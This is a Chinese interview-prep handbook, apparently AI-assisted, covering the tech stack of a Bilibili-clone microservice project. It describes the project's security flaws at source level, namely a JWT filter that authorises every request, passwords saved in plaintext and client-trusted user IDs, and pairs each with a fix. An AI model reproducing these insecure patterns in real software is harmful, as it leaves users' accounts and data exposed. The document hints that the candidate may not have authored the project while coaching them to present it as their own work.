# 来源: aigcbilibili\deliverables\面试问答-按技术栈分点.md
# 类型: 面试材料  作者可信度: AI协作产出

# LABiliBili（aigcbilibili）项目面试问答手册

## —— 按技术栈分点：每个组件在项目里到底干了什么

---

## 使用说明（先读这 1 分钟）

**这份文档解决什么问题**

大多数候选人面试挂在同一个地方：简历上写了 22 个技术栈，面试官随便挑一个问「这个在你项目里干什么用的」，答不上来或者只能背概念。这份文档把 **22 个技术栈逐一拆开**，每一项都回答三件事：

1. **它在这个项目里具体解决了哪个业务问题**（不是通用定义，是这个项目里的实际位置）
2. **面试官会怎么问、标准答案是什么**（含源码级证据）
3. **会被追问到哪里、以及代码里有哪些坑要主动暴露**

**标注说明**

| 标注 | 含义 | 应对策略 |
|---|---|---|
| **[必答]** | 出现概率极高，答不出来直接减分 | 必须背到能脱口而出 |
| **[进阶]** | 考察深度，区分中级和高级 | 讲清取舍与代价 |
| **[深挖]** | 面试官拿着你代码问「这里为什么这么写」 | 主动认缺陷 + 给重构方案 |
| **[送命]** | 答错会被判定为「没真做过」 | 必须坦诚承认，然后补正确做法 |

**一个通用心法**

技术栈类问题的最优答题结构永远是三段：

> **① 项目里用它做什么（业务场景）→ ② 为什么选它而不是替代方案（技术选型）→ ③ 它在这个项目里的局限/我踩过的坑（工程意识）**

只答第 ① 段是初级，三段都答是「真的做过」。这份文档每一节都按这个结构组织。

---

## 第 0 章 项目全景：先讲清这张图

### 0.1 项目是什么

一个**前后端分离的仿 B 站微服务项目**，业务覆盖：视频投稿与播放、弹幕、评论、点赞收藏、用户主页与关注、私聊与消息通知、AIGC 创作（文生文 / 文生图 / 生成 PPT 文案）、聚合搜索。

### 0.2 服务清单与端口（背下来，面试官一定会问「你们几个服务」）

| 模块 | 服务名 | 端口 | 职责 |
|---|---|---|---|
| `java/gateway` | gateway | **8200** | 统一入口、路由、JWT 签发与校验、登录注册 |
| `java/user_center` | user-center | **3000** | 用户信息、个人主页权限、关注/粉丝、收藏夹、视频合集 |
| `java/video` | video | **10201** | 视频投稿（分片上传）、点赞、评论、弹幕、播放记录 |
| `java/notice` | notice | **30000** | 消息通知（点赞/评论/动态/私聊），RocketMQ 消费者集中地 |
| `java/search` | search | **8201** | Elasticsearch 聚合搜索、关键字补全、推荐视频 |
| `java/chat` | chat | **1688** | WebSocket 长连接、一对一私聊、AIGC（星火大模型） |
| `java/common` | common（**jar，不是服务**） | — | 实体、Mapper、Feign 客户端、统一返回 `Result`、全局异常 |

**中间件与端口**

| 组件 | 端口 | 用途 |
|---|---|---|
| MySQL | 3306 | 业务库 `bilibili` |
| Redis | 6379 | 验证码、缓存、ES 增量同步队列、转码令牌 |
| Nacos | 8848 | 服务注册与发现 |
| Elasticsearch | 9200 | `video` / `user` / `history_search` 索引 |
| RocketMQ | 9876（NameServer） | 5 个 topic 的异步解耦 |
| MinIO | 9000（S3 API） | 视频、封面、头像对象存储 |
| Zipkin | 9411 | 全链路追踪可视化 |
| XXL-Job Admin | 8080 | 分布式定时任务调度中心 |

### 0.3 三个必须能画出来的数据流

**流 1：投稿 → 转码 → 入搜索索引**

```
用户 → gateway → video 服务
  video: 分片上传 → MinIO(video 桶) → composeObject 合并 → 落库 Video/VideoData
       → Feign 调 notice.sendUploadNotice → RocketMQ topic "video-encode"
  notice: VideoEncodeConsumer 消费 → Feign 回 video 拉视频流
       → jave 截封面 + 读时长 → 非 H264 则转码 → Feign 回传 video
       → 发 RocketMQ topic "mysqlToEs"
  notice: MysqlToEsConsumer → Redis List（add:video / update:video）
  search: xxl-job "mysqlToEs" 定时捞 Redis List → ES bulk upsert
```

**流 2：点赞 → 通知 → 未读数**

```
用户点赞 → video.LikeServiceImpl → 落库 like + 更新 VideoData.likeCount
        → Feign notice.sendLikeNotice → RocketMQ topic "like"
  notice: LikeConsumer (ORDERLY 顺序消费) → 落库 like_notice
用户查询 → notice.GetNoticeServiceImpl → MPJLambdaWrapper 多表 join 统计未读数
```

**流 3：私聊 / AIGC（WebSocket）**

```
浏览器 → gateway 路由 (Path=/ljl/chat, uri=ws://localhost:1688) → chat 服务
  连接建立：后端下发 {type:"sessionId", sessionId:...}
  前端 init：{type:"init", userId, sessionId} → 后端存两张映射表
  发消息：{type:"message", receiverId, content} → 在线直推，离线落库
  问模型：{type:"bigmodel", question} → OkHttp 连星火 → 增量帧原样透传回浏览器
```

### 0.4 开场自我介绍模板（60 秒版）

> 「我做的是一个仿 B 站的微服务项目，按业务拆了 6 个服务：网关、用户中心、视频、通知、搜索、聊天。技术栈是 SpringBoot 2.6 + SpringCloud Alibaba 2021.0.4，用 Nacos 做注册发现、Gateway 做统一入口、OpenFeign 做服务间调用。
>
> 中间件上，MySQL 用 MyBatis-Plus 做单表、MPJ 做多表；Redis 承担验证码、ES 增量同步队列和转码令牌；RocketMQ 把转码、通知、数据同步这三类异步链路解耦；MinIO 存视频和封面；ES 提供聚合搜索和 more_like_this 推荐；XXL-Job 定时做 MySQL→ES 同步；Sleuth+Zipkin 做链路追踪。
>
> 业务上我觉得最有讲头的有三块：**一是分片上传 + 断点续传 + 异步转码的完整链路**，二是**基于 RocketMQ + Redis + XXL-Job 的 MySQL 到 ES 的最终一致性同步方案**，三是 **WebSocket 上同时跑私聊和 AIGC 流式对话**。」

---

## 第 1 章 SpringBoot —— 快速开发 Java 应用程序

### 1.1 在这个项目里它扮演什么角色

**一句话**：它是所有 6 个服务的**运行底座和统一脚手架**。项目里没有任何一个功能是「用 SpringBoot 实现的」，但**所有功能都靠 SpringBoot 才写得多快**。

具体落点：

| 落点 | 源码位置 | 作用 |
|---|---|---|
| 父 POM 统一依赖版本 | `java/pom.xml`（`<parent>` 指向 `spring-boot-starter-parent` 2.6.11） | 7 个模块共享一套版本，杜绝 jar 冲突 |
| `dependencyManagement` 统一管理 | `java/pom.xml` 100+ 个 `<dependency>` | 子模块引用不写版本号 |
| 每个服务一个启动类 | 如 `VideoApplication`、`ChatApplication` | `@SpringBootApplication` 自动装配 |
| 自动配置 | `spring-boot-starter-*` 系列 | 引依赖即生效：`spring-boot-starter-data-redis` 引入后 `RedisTemplate` 自动可用 |
| `@ConfigurationProperties` 外部化配置 | `search` 的 `ElasticsearchClientProperties`（绑定 `elasticsearch-client.hosts`） | 配置与代码分离 |
| `@ConditionalOnProperty` 条件装配 | `GlobalExceptionHandler` 上 `global-exception-handler.enabled` | **这是项目里一个很聪明的用法，见 1.3-Q5** |
| `@ConditionalOnMissingBean` | `ElasticsearchClientConfig.restHighLevelClient()` | 允许业务方覆盖默认 Bean |
| `@Value` + SpEL 默认值 | `@Value("${minio.file-path:http://localhost:9000/}")` | 有默认值 → 本地零配置能跑 |

### 1.2 高频问答

**Q1 [必答] 你为什么用 SpringBoot，而不是 Spring 原生或别的框架？**

- **考点**：技术选型意识，不要背官网广告词。

- **答**（三段结构）：
  - **① 项目里它解决什么**：6 个微服务 + 1 个 common 模块要共享一套依赖版本、一套配置方式、一套启动模型。用 SpringBoot 父 POM 统一管版本，用 starter 让每个中间件「引入依赖即用」，我写业务的时间占比从「配环境」变成了「写逻辑」。
  - **② 为什么不是别的**：Spring 原生要手写 `web.xml`、`DispatcherServlet` 注册、`DataSource` Bean、事务管理器、Jackson 配置——这些在微服务 × 6 个副本的场景下是纯粹的重复劳动。Quarkus/Micronaut 启动更快，但**生态成熟度和团队熟悉度**在招聘市场上完全不能比，SpringCloud 全家桶（Nacos/Gateway/Sleuth）也只跟 SpringBoot 最贴。
  - **③ 代价**：SpringBoot「约定优于配置」的另一面是**隐式魔法**——出问题时（比如自动配置没生效）排查成本高。我这个项目里就踩过一次：Elasticsearch 客户端自动配置和手动配置打架，最后用 `@ConditionalOnMissingBean` 显式让手动配置优先。

**Q2 [必答] SpringBoot 自动配置的原理是什么？**

- **考点**：`@EnableAutoConfiguration` → `spring.factories` → `AutoConfigurationImportSelector`。

- **答**：
  1. `@SpringBootApplication` 是一个组合注解，其中 `@EnableAutoConfiguration` 是关键；
  2. `@EnableAutoConfiguration` 通过 `@Import(AutoConfigurationImportSelector.class)` 导入选择器；
  3. 选择器在 SpringBoot 2.6 及以前读的是 `META-INF/spring.factories` 里 `EnableAutoConfiguration` 键对应的类名列表（**2.7 起改为 `META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports`**）；
  4. 这些候选配置类再经过 `@ConditionalOnClass` / `@ConditionalOnMissingBean` / `@ConditionalOnProperty` 等条件注解过滤，满足条件的才真正注册 Bean；
  5. 最后 `@ConfigurationProperties` 把 `application.yml` 的值绑到 Bean 上。
  
  - **项目实证**：我 `search` 模块的 `ElasticsearchClientConfig` 就是照这个机制「抢」自动配置的——类上加 `@ConditionalOnMissingBean(RestHighLevelClient.class)`，保证如果第三方 starter 已经配了客户端就不覆盖，否则用我手工构建的（我要自定义 IO 线程数和 300 秒超时，默认配置给不了）。

**Q3 [进阶] SpringBoot 的启动流程讲一下。**

- **答**（挑重点讲，不要背 12 步）：
  1. `SpringApplication.run()` → 推断应用类型（Servlet/Reactive/None）；
  2. `prepareEnvironment()`：加载 `application.yml` → 发布 `ApplicationEnvironmentPreparedEvent`；
  3. `createApplicationContext()`：根据类型创建 `AnnotationConfigServletWebServerApplicationContext`；
  4. `refreshContext()`：核心是 `invokeBeanFactoryPostProcessors()`（解析 `@Configuration`、`@ComponentScan`）+ `onRefresh()`（**内嵌 Tomcat 就是在这创建的**）+ `finishBeanFactoryInitialization()`（实例化所有单例）；
  5. `callRunners()`：执行 `ApplicationRunner` / `CommandLineRunner`。
  
  - **项目实证**：我 `search` 服务的 `ElasticsearchClientConfig` 里有一段 `while(true) { client.ping() ... sleep(10) }`，因为它在 Bean 初始化阶段执行，**会自动阻塞整个应用启动直到 ES 连通**。这是我当时的做法，见 Q6 的自评。

**Q4 [进阶] 配置文件的加载优先级是怎样的？**

- **答**：命令行参数 > `SPRING_APPLICATION_JSON` > 操作系统环境变量 > 外部 `application-{profile}.yml` > 外部 `application.yml` > jar 内 `application-{profile}.yml` > jar 内 `application.yml` > `@PropertySource` > 默认值。
  
  - **项目实证**：我的 `gateway` 用 `application.yml` 只放一行 `spring.profiles.active: dev`，真正的配置在 `application-dev.yml`。这样做的目的是**环境隔离**——生产部署时用 `--spring.profiles.active=prod` 或容器环境变量覆盖，不用改代码。
  - **加分句**：`docker/config/*/application.yml` 这类**外置配置**优先级高于 jar 内配置，所以容器化后不用重新打镜像就能改连接地址，这是十二要素应用里「配置与代码分离」的实践。

**Q5 [深挖] 你的 `GlobalExceptionHandler` 上为什么加了 `@ConditionalOnProperty`？**

- **考点**：**这题答好了非常加分**，因为它体现你处理过真实的框架冲突。

- **答**：因为网关和其他服务的 Web 模型不一样。
  - `gateway` 是 **WebFlux（响应式）**，其他 5 个服务是 **Spring MVC（Servlet）**；
  - `GlobalExceptionHandler` 是 `@RestControllerAdvice` + 注入 `HttpServletResponse`，**这是 MVC 独有的类**；
  - 如果网关也加载这个 Bean，WebFlux 环境里注入 `HttpServletResponse` 会直接导致**上下文启动失败或异常处理链路错乱**，表现是「异常被吞掉、看不到真实堆栈，也不知道是哪一层抛的」；
  - 所以我在 `common` 里的处理器上加 `@ConditionalOnProperty(name = "global-exception-handler.enabled", havingValue = "true", matchIfMissing = true)`，然后在各服务的 yml 里显式开关：`video` / `notice` / `search` / `user_center` 都写 `enabled: true`，**唯独 `gateway` 写 `enabled: false`**。
  
  - **源码证据**：`java/common/src/main/java/ljl/bilibili/handler/GlobalExceptionHandler.java:14`、`java/gateway/src/main/resources/application-dev.yml` 末尾 `global-exception-handler: enabled: false`。

**Q6 [深挖] 你的全局异常处理器有什么问题？**

- **考点**：这是面试官会真的质疑的点。

- **答**（主动认，别狡辩）：
  1. **HTTP 状态码用的是 600**：`httpServletResponse.setStatus(600)`。600 不是合法 HTTP 状态码（标准只有 1xx–5xx，600 属于未定义区间），部分网关、Nginx、浏览器会当成协议错误处理，前端 `axios` 也拿不到正常的 `error.response`。正确做法是返回 **200 + 业务错误码**，或者用 4xx/5xx 语义化状态码。
  2. **吞掉了异常类型**：`@ExceptionHandler(Exception.class)` 一把梭，业务异常（参数校验失败）和系统异常（NPE、SQL 超时）返回同样的「寄了」。应该分层：`BizException → 400 + 错误码`、`MethodArgumentNotValidException → 参数提示`、兜底 `Exception → 500`。
  3. **`exception.printStackTrace()` 与 `log.error` 重复**：既打控制台又打日志，生产环境会造成双份 I/O。
  4. **错误信息直接透给前端**：`"寄了," + exception.getMessage()` 可能泄露 SQL 语句或内部类名，属于信息泄露。
  
  - **加分句**：重构方向是「异常分层 + 错误码枚举 + 统一响应体 `Result`，并且日志里带 traceId 便于和 Zipkin 对齐」。

**Q7 [进阶] starter 的原理是什么？你自己写过一个 starter 吗？**

- **答**：一个 starter 本质是「**一个空的 pom + 一套自动配置类 + 一份 `spring.factories`**」。
  - 空的 pom 引入所有需要的依赖；
  - 自动配置类上用 `@Configuration` + `@ConditionalOnClass` + `@EnableConfigurationProperties`；
  - `spring.factories`（2.7 后是 `AutoConfiguration.imports`）声明配置类全限定名。
  
  - **项目实证**：我虽然没独立发布 starter，但项目里的 `java/common` 模块就是这个思路的**简化版**——它被所有服务依赖，里面装了实体、Mapper、Feign 客户端、`Result`、`GlobalExceptionHandler`。代价是我在 `common` 里改一行代码（比如改默认头像地址），**6 个服务的镜像全部要重新构建**，这一点我在项目文档里专门标注过（FIX-11/FIX-13 同类约束）。

### 1.3 主动暴露的坑（面试官问「有什么不足」时用）

| 问题 | 位置 | 影响 | 正确做法 |
|---|---|---|---|
| 异常状态码 600 | `GlobalExceptionHandler` | 非法状态码，网关/前端处理异常 | 用 200+业务码 或标准 4xx/5xx |
| `common` 变动要全量重建 | `java/common` | 发布成本高 | 拆成 artifact 走私服版本管理 |
| ES 客户端阻塞启动 | `ElasticsearchClientConfig:60-73` | ES 挂掉则服务起不来 | 改成启动后异步探测 + 健康检查 |
| 大量 `@Value` 散落 | 各 `*ServiceImpl` | 配置项无集中管理 | 改 `@ConfigurationProperties` 聚合 |

---

## 第 2 章 Spring Security —— 具备强大的鉴权授权

### 2.1 在这个项目里它扮演什么角色

**一句话**：**只在网关（8200）生效**，负责「放行白名单 + 强制 `role:user` 权限 + 密码 BCrypt 加密」；同时项目里用 `PasswordEncoder` 做密码哈希。

关键落点：

| 落点 | 源码 | 说明 |
|---|---|---|
| 安全过滤器链 | `gateway/config/SecurityConfig.java` | `SecurityWebFilterChain` bean |
| 自定义 JWT 过滤器插入 | 同上 `:52` | `addFilterAt(new JwtAuthorizationFilter(), SecurityWebFiltersOrder.AUTHORIZATION)` |
| 白名单 | 同上 `:33-43` | `permitAll()` 放了约 20 条路径 |
| 强制权限 | 同上 `:45` | `.anyExchange().hasAuthority("role:user")` |
| 密码加密 | 同上 `:61-63` | `BCryptPasswordEncoder` |
| WebFlux 下 Feign 的坑 | 同上 `:67-71` | 手动注入 `HttpMessageConverters` |

### 2.2 高频问答

**Q1 [必答] Spring Security 在你项目里做了什么？**

- **答**（三段）：
  - **① 做什么**：网关是所有请求的唯一入口，我在这里用 Security 做「**认证 + 粗粒度授权**」：白名单路径（注册、获取首页视频、获取搜索结果等）直接放行；其余路径要求持 `role:user` 权限。认证的凭据是 JWT，由自定义的 `JwtAuthorizationFilter` 解析后写入 `SecurityContext`。同时 `PasswordEncoder`（BCrypt）负责注册/登录时的密码哈希与校验。
  - **② 为什么放在网关而不是各微服务**：微服务架构下**边界鉴权**比**每服务鉴权**更合理——网关是唯一入口，在这里拦掉未认证请求，下游服务就不用重复写拦截器；而且 `gateway` 是 WebFlux 响应式的，过滤器链天然非阻塞，不会因为鉴权引入额外线程等待。
  - **③ 代价**：网关不掌握业务权限（比如「只有作者能删自己的视频」），所以**粗粒度在网关、细粒度在业务层**，业务层的鉴权我目前是「信任前端传的 userId」，这是一个已知缺口（见 Q5）。

**Q2 [必答] 你的自定义过滤器是怎么被挂进 Security 链路的？**

- **考点**：Spring Security 的过滤器注册机制。**这题有个反直觉的点，答出来说明你真读过代码**。

- **答**：
  - 常规做法是 `@Component` 让 Spring 扫描到，然后 `http.addFilterBefore(myFilter, UsernamePasswordAuthenticationFilter.class)`；
  - 但我这个项目里 `JwtAuthorizationFilter` 上的 `@Component` 是**被注释掉的**（`JwtAuthorizationFilter.java:25` → `//@Component`），而 `SecurityConfig` 里是**手动 `new` 出来的**：`addFilterAt(new JwtAuthorizationFilter(), SecurityWebFiltersOrder.AUTHORIZATION)`。
  - **为什么要手动 new**：因为 `JwtAuthorizationFilter implements WebFilter`，WebFlux 里**任何 `WebFilter` 类型的 Bean 都会被自动加入 Web 过滤器链**。如果同时用 `@Component` 注册 + `addFilterAt` 挂载，这个过滤器就会**执行两次**。手动 new 一个非 Bean 实例，就只走 Security 链，走一次。
  - 这个细节在我代码注释里写明了：「添加自定义权限校验器，不交与 Spring 管理解决重复经过过滤器的问题」。

**Q3 [进阶] `WebSecurityConfigurerAdapter` 在网关里用有什么问题？**

- **考点**：WebFlux vs MVC 的配置类体系。

- **答**：`WebSecurityConfigurerAdapter` 是 **Servlet（MVC）** 体系的适配器，在 WebFlux 环境下它**没有任何作用**——网关真正生效的是 `SecurityWebFilterChain` 这个 `@Bean`。
  
  我 `SecurityConfig` 里继承 `WebSecurityConfigurerAdapter` 是**历史残留**（从 SpringBoot 2.6 的 MVC 项目模板搬过来的），加上 `@EnableWebSecurity` 会引入一部分 MVC 的安全自动配置，属于无用甚至可能有害的写法。正确写法是：
  ```java
  @Configuration
  @EnableWebFluxSecurity   // 注意是 WebFlux，不是 WebSecurity
  public class SecurityConfig {
      @Bean
      public SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) { ... }
  }
  ```
  **加分句**：SpringBoot 2.6 里 `WebSecurityConfigurerAdapter` 已经标记 `@Deprecated`，SpringBoot 3 / Security 6 里被彻底移除，改成了「声明 `SecurityFilterChain` Bean」的方式，这个迁移我了解过。

**Q4 [深挖] 你的 `JwtAuthorizationFilter` 有个大问题，你发现了吗？**

- **考点**：**这是本章最重要的题**。面试官只要看一眼代码就会发现。

- **答**（**必须坦诚，然后给出正确实现**）：
  - **问题**：这个过滤器名叫「JWT 授权过滤器」，但**它完全没有解析 JWT**。真正从 header 取 token、调 `JwtUtil.getClaimsFromToken()` 拿 role 的那几行代码**全被注释掉了**（`:39-51`），现在无条件构造了一个固定权限：
    ```java
    SimpleGrantedAuthority authority = new SimpleGrantedAuthority(JWT_ROLE + ":" + "user");
    Authentication authentication = new UsernamePasswordAuthenticationToken("username", "password", Collections.singletonList(authority));
    ```
  - **后果**：`SecurityConfig` 里那句 `.anyExchange().hasAuthority("role:user")` **形同虚设**——因为任何请求进来都会被赋予 `role:user`。也就是说**网关现在等于没有鉴权**，这是最高优先级的安全缺陷。
  - **为什么我会写成这样**：（诚实说原因）调通过程中 JWT 解析一报错就 401，前端联调卡住，我为了先跑通业务把解析逻辑注释掉，用固定权限先过关——**这是典型的「临时方案变永久方案」，也说明我没有做上线前的安全自查**。
  - **正确实现**：
    ```java
    String jwt = exchange.getRequest().getHeaders().getFirst(Constant.SHORT_TOKEN);
    if (jwt == null) {                       // 无 token 直接 401
        exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);
        return exchange.getResponse().setComplete();
    }
    Claims claims = JwtUtil.getClaimsFromToken(jwt);   // 解析 + 验签 + 验过期
    String role = claims.get(JWT_ROLE, String.class);
    Integer userId = claims.get(USERIDENTITY, Integer.class);
    // 关键：把 userId 放到请求头传给下游，下游不再信任前端传的 userId
    ServerHttpRequest mutated = exchange.getRequest().mutate()
            .header("X-User-Id", String.valueOf(userId)).build();
    ServerWebExchange newExchange = exchange.mutate().request(mutated).build();
    Authentication auth = new UsernamePasswordAuthenticationToken(
            userId, null, Collections.singletonList(new SimpleGrantedAuthority("role:" + role)));
    SecurityContext ctx = new SecurityContextImpl(auth);
    return chain.filter(newExchange)
            .contextWrite(ReactiveSecurityContextHolder.withSecurityContext(Mono.just(ctx)));
    ```
  - **顺带说明为什么现在白名单那么长**：正因为过滤器不解析 token、只有固定权限，很多需要「登录后可用」的接口（获取首页视频、获取用户信息）干脆全被 `permitAll` 放行了（`SecurityConfig:33-43` 放了 20 多条路径）。**修好过滤器之后，这份白名单要同步收窄**，这是配套改动。

**Q5 [进阶] 那业务层的鉴权是怎么做的？**

- **答**：现状是「**前端传 userId，后端直接用**」。例如 `WebSocketHandler.handleTextMessage` 里 `json.get("userId").getAsString()` 直接当身份用；`LikeServiceImpl`、`PlayServiceImpl` 的 `userId` 也是入参。
  
  **风险**：改一个 `userId` 就能以他人身份操作（给别人点赞、读别人的私聊和 AI 会话上下文）。
  
  **正确做法**（两层）：
  1. 网关解析 JWT 后把 `userId` 写进 `X-User-Id` 请求头，**下游所有服务统一从 header 取身份**，不再信任 body/query 里的 userId；
  2. WebSocket 不走路由过滤器，要在**握手阶段**（`HandshakeInterceptor`）用 `?token=` 或 Cookie 校验 JWT，把 userId 绑到 `WebSocketSession.getAttributes()` 上，后续消息一律从会话取身份。

**Q6 [进阶] BCrypt 为什么比 MD5 加盐好？**

- **答**：
  1. **自带盐**：BCrypt 每次加密会随机生成 salt 并**存在密文里**（所以同一密码两次加密结果不同），不需要我自己维护 salt 字段；
  2. **可调计算成本**：`BCryptPasswordEncoder(strength)` 的 cost 参数（默认 10，即 2¹⁰ 次迭代）让暴力破解成本随硬件提升而线性上升，MD5 是固定且极快的，GPU 每秒能算几十亿次；
  3. **抗彩虹表**：MD5 加盐虽然也抗彩虹表，但**速度快这个原罪不改的话，离线爆破依然容易**；
  4. **Spring Security 内置**：`PasswordEncoder` 接口 + `matches()` 自动处理盐和编码版本前缀（`$2a$10$...`），还能平滑升级到 `DelegatingPasswordEncoder` 做多算法兼容。
  
  - **项目实证**：`LoginServiceImpl:80` 用 `passwordEncoder.matches(rawPassword, user.getPassword())`，`SecurityConfig:62` 注册了 `BCryptPasswordEncoder`。
  - **但我要主动指出一个 bug**：`LoginServiceImpl:107` 和 `:149` 是 `passwordEncoder.encode(newUser.getPassword());`——**没有接收返回值**！`PasswordEncoder.encode()` 返回新字符串而不修改原对象，所以这两行等于什么都没做，注册用户存进库的密码仍然是明文（如果不为 null 的话）。正确写法是 `newUser.setPassword(passwordEncoder.encode(newUser.getPassword()))`。
  - 而且 `:101` 和 `:141` 这两处更奇怪：用 `passwordEncoder.matches(phoneNumber, user.getPhoneNumber())` 去校验**手机号**——手机号根本没被加密过，这个 `matches` 永远返回 false，导致「已有用户走手机号登录」这条分支**永远不生效**。这属于典型的「复制粘贴改漏了」。

**Q7 [进阶] CSRF 为什么可以关掉？**

- **答**：CSRF 攻击成立的前提是「浏览器**自动携带**凭据（Cookie/Session）」。而我的架构是：
  1. 前后端分离，认证凭据是 **JWT**，前端手动放在 `shortAuthorization` 请求头里（`Constant.SHORT_TOKEN = "shortAuthorization"`），**不是 Cookie**；
  2. `SecurityConfig` 里没有配 session（无状态），服务端不靠 Cookie 识别身份。
  
  攻击者伪造的跨站请求**无法带上自定义 header**（会被浏览器 CORS 预检拦掉），所以 CSRF 天然不成立，可以 `csrf().disable()`。
  
  **但有个隐患我必须说**：`LoginServiceImpl.getCaptcha()` 里用 `cookie.getValue()` 当 Redis key（`:203`），说明图形验证码那条链路**是依赖 Cookie 的**。既然用了 Cookie，那这条链路就存在 CSRF/会话固定风险——应该改成把 sessionId 放在响应体里让前端保存，或者给 Cookie 加 `SameSite=Strict` + `HttpOnly`。

**Q8 [深挖] 你那个 `HttpMessageConverters` 的 Bean 是干什么的？**

- **考点**：**这题很冷门，答出来极其加分**，因为它证明你真的被这个坑绊过。

- **答**：
  - **现象**：网关在 WebFlux 环境下用 OpenFeign 调用下游服务，会报 `No qualifying bean of type 'org.springframework.boot.autoconfigure.http.HttpMessageConverters'`，或者反序列化失败。
  - **原因**：`HttpMessageConverters` 这个 Bean 是 **`spring-boot-starter-web`（MVC）的自动配置**提供的；而网关用的是 `spring-boot-starter-webflux`，**WebFlux 不提供这个 Bean**。但 Feign 的编码器/解码器（`SpringDecoder`）在 SpringCloud 2021.x 里仍然依赖 `HttpMessageConverters`。
  - **解决**：手动注入一个：
    ```java
    @Bean
    @ConditionalOnMissingBean
    public HttpMessageConverters messageConverters(ObjectProvider<HttpMessageConverter<?>> converters) {
        return new HttpMessageConverters(converters.orderedStream().collect(Collectors.toList()));
    }
    ```
    用 `ObjectProvider` 是为了把 WebFlux 已经注册好的转换器**收集起来**复用，而不是自己造一套。
  - **源码位置**：`gateway/config/SecurityConfig.java:67-71`。

### 2.3 主动暴露的坑

| 问题 | 位置 | 严重度 | 正确做法 |
|---|---|---|---|
| **过滤器不解析 JWT，权限恒定** | `JwtAuthorizationFilter:52-61` | 🔴 致命 | 真正解析 token，解析后写 `X-User-Id` 给下游 |
| **网关鉴权形同虚设 + 白名单过长** | `SecurityConfig:33-45` | 🔴 致命 | 修好过滤器后收窄白名单 |
| **注册密码 encode 未赋值** | `LoginServiceImpl:107,149` | 🟠 高 | `setPassword(encode(...))` |
| **用 matches 校验手机号** | `LoginServiceImpl:101,141` | 🟠 高 | 直接字符串比较 |
| 继承 MVC 的 Adapter | `SecurityConfig:23` | 🟡 中 | `@EnableWebFluxSecurity` + `SecurityWebFilterChain` |
| 验证码用 Cookie 当 Redis key | `LoginServiceImpl:203` | 🟡 中 | 前端保存 sessionId，或 Cookie 加 SameSite |
| 无 CORS 配置 | `SecurityConfig` | 🟡 中 | 明确 `corsConfigurationSource`，别靠 `*` |

---

## 第 3 章 Nacos —— 服务注册与发现

### 3.1 在这个项目里它扮演什么角色

**一句话**：Nacos 是这台「微服务电话簿」。6 个服务启动时把自己的 `ip:port` 注册进去，服务间要用 Feign 调用时先去 Nacos 拿到实例列表。**没有它，`@FeignClient(name = "video")` 这个服务名根本解析不出地址**。

关键落点：

| 落点 | 源码 / 配置 | 说明 |
|---|---|---|
| 服务注册配置 | `java/*/src/main/resources/application.yml` | 每个服务都有 `spring.cloud.nacos.discovery.server-addr` |
| video / search 的 Nacos 被注释 | `video/application.yml`、`search/application.yml` | **重要缺陷，见 3.2-Q4** |
| 依赖引入 | `java/pom.xml` `spring-cloud-starter-alibaba-nacos-discovery` | 版本 2.1.2.RELEASE |
| bootstrap 支持 | `spring-cloud-starter-bootstrap` 3.0.5 | 用 nacos-config 必需 |
| 排除 Ribbon | `nacos-discovery` 里 `<exclusion>` 掉 `spring-cloud-starter-netflix-ribbon` | 改用 Spring Cloud LoadBalancer |
| 版本对齐 | 父 POM `spring-cloud-alibaba-dependencies` **2021.0.4.0** + `spring-cloud-dependencies` **2021.0.4** | 见 3.2-Q3 |

### 3.1.1 ⚠️ 【必须先知道的事实】这个仓库里 Nacos 实际上没有运行

**这是全篇最需要你提前掌握的一条，因为它直接决定你面试时该怎么讲 Nacos。**

我核对了仓库的真实状态，结论是：

| 检查项 | 结果 |
|---|---|
| 父 POM `dependencyManagement` 是否声明 nacos 依赖版本 | ✅ 有（`java/pom.xml:44-48, 302-320`） |
| **任何子模块 pom 是否真正 `<dependency>` 引入 nacos** | ❌ **没有**（`common/pom.xml:55` 那行是**注释掉的**） |
| 已构建的 fat jar 里是否含 nacos client | ❌ **5 个 jar 全部为 none**（gateway 76MB / notice 265MB / user_center 64MB / video 262MB 都没有） |
| 各服务 yml 是否写了 nacos 配置 | ✅ 有（gateway / notice / user_center / chat） |
| 结论 | **yml 里的 `spring.cloud.nacos.discovery.server-addr` 是一段「没有依赖支撑的配置」，Spring 会直接忽略它，服务不会注册到 Nacos。** |

**验证方法（面试官让你现场证明时可以这么说）**：
```bash
# 解开任一服务的可执行 jar，看有没有 nacos 客户端
unzip -l java/gateway/target/gateway-1.0.jar | grep -i nacos
# → 无输出
```

**这意味着什么（面试时要怎么讲）**

- **不要**说「我用 Nacos 做了服务注册与发现」——被追问「那你说说注册上去的实例元数据长什么样」「Nacos 控制台里能看到几个服务」就会露馅。
- **正确讲法**（诚实 + 展示理解）：
  > 「我要先说明一个事实：**当前仓库里 Nacos 只有配置没有依赖**——父 POM 在 `dependencyManagement` 里声明了版本，但没有任何子模块真正引入 starter，我验证过构建出来的 jar 里没有 nacos 客户端，所以服务实际上没注册上去，yml 里那段配置是被 Spring 静默忽略的。这是我这个项目最需要修的一处『技术栈写了但没跑起来』的问题。
  >
  > 至于为什么会这样：项目里所有 Feign 调用都写死了 `url`，绕过了服务发现，所以不注册也能跑通，作者（和我本人）就没有发现这个缺口。
  >
  > **要让 Nacos 真正生效，只需要三步**：① 在 `common/pom.xml` 或各服务 pom 里引入 `spring-cloud-starter-alibaba-nacos-discovery`（现在是注释状态）；② 去掉 Feign 的 `url` 属性，只留 `@FeignClient(name="video")`；③ 网关路由从 `uri: http://localhost:10201` 改为 `uri: lb://video`。这样服务名解析、负载均衡、实例上下线才对代码透明。」

- **加分句**：**「判断一个技术栈是不是真的用上了，不能看 yml 和 README，要看依赖树和运行日志。我一般用 `mvn dependency:tree | grep nacos` 或者解 jar 来验证。**」这句话能立刻把你和「堆技术栈」的候选人区分开。

### 3.2 高频问答

**Q1 [必答] 为什么要用 Nacos？解决了什么问题？**

- **答**（三段）：
  - **① 解决什么**：微服务下服务实例的地址是**动态的**——本地开发是 `localhost:10201`，容器化后是 `video:10201`，扩容后有多个 IP。如果把这些地址写死在配置文件或 Feign 的 `url` 里，每次部署都要改配置、重启。Nacos 让服务自己注册、消费者按**服务名**查找，地址变化对代码透明。
  - **② 为什么是 Nacos 不是 Eureka/Zookeeper/Consul**：
    | 维度 | Nacos | Eureka | Zookeeper |
    |---|---|---|---|
    | CAP | 支持 **AP 和 CP 两种模式切换** | 只 AP | 只 CP |
    | 配置中心 | **自带**（注册+配置一体） | 无 | 需额外搭 |
